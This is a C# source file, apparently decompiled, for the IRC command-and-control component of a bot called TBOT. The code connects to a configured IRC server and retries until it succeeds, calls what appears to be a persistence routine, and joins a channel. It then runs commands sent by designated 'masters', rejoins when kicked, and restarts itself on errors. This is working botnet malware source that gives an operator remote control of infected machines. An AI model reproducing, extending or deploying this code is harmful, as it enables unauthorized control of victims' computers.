using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace TBOT;

internal class Irc
{
	private static StreamWriter sw;

	private static StreamReader sr;

	private static NetworkStream stream;

	public static TcpClient ircClient;

	public static void Initialize()
	{
		while (true)
		{
			try
			{
				ircClient = new TcpClient(Config.ircHost, Config.ircPort);
			}
			catch (Exception)
			{
				Thread.Sleep(300000);
				continue;
			}
			break;
		}
		stream = ircClient.GetStream();
		sr = new StreamReader(stream);
		sw = new StreamWriter(stream);
		Endure.Begin();
		if (Config.ircPass != "")
		{
			Write("PASS " + Config.ircPass);
		}
		Write("USER TBOT IS HERE TO :STAY");
		Write("NICK " + Config.ircNick);
		Write("JOIN " + Config.ircChannel + " " + Config.ircChannelPass);
		listenToIrc();
	}

	private static void listenToIrc()
	{
		string empty = string.Empty;
		while (true)
		{
			try
			{
				while (true)
				{
					if ((empty = sr.ReadLine()) == null)
					{
						continue;
					}
					if (empty.Contains("PRIVMSG"))
					{
						string text = empty.Substring(1, empty.IndexOf("!") - 1);
						string[] ircMasters = Config.ircMasters;
						foreach (string text2 in ircMasters)
						{
							if (text2 == text)
							{
								int num = empty.IndexOf("PRIVMSG ") + 8;
								int num2 = empty.IndexOf(" :");
								empty.Substring(num, num2 - num);
								string text3 = empty.Substring(num2 + 2);
								if (text3.StartsWith(Config.ircCommandPrefix))
								{
									Functions.determineWho(text3.Substring(1));
								}
								break;
							}
						}
						continue;
					}
					if (empty.Contains("PING :"))
					{
						int startIndex = empty.IndexOf("PING :") + 6;
						string text4 = empty.Substring(startIndex);
						Write("PONG :" + text4);
						continue;
					}
					if (empty.Contains("KICK " + Config.ircChannel + " " + Config.ircNick))
					{
						Write("JOIN " + Config.ircChannel + " " + Config.ircChannelPass);
						WriteTo(Config.ircChannel, "Yeah, Fuck You Too!");
						continue;
					}
					bool flag = false;
					string[] array = new string[5] { "Erroneus nickname", "Unknown command", "You have not registered", "ERROR", "throttled" };
					string[] array2 = array;
					foreach (string text5 in array2)
					{
						if (empty.ToLower().Contains(text5.ToLower()))
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						ircClient.Close();
						Thread.Sleep(500);
						Program.Main(null);
					}
				}
			}
			catch (Exception)
			{
				ircClient.Close();
				Thread.Sleep(500);
				Program.Main(null);
			}
		}
	}

	public static void WriteTo(string chan, string msg)
	{
		Write("PRIVMSG " + chan + " : \u00035 " + msg);
	}

	public static void Write(string msg)
	{
		try
		{
			sw.WriteLine(msg);
			sw.Flush();
		}
		catch (Exception)
		{
			Thread.Sleep(2000);
		}
		Thread.Sleep(300);
	}
}
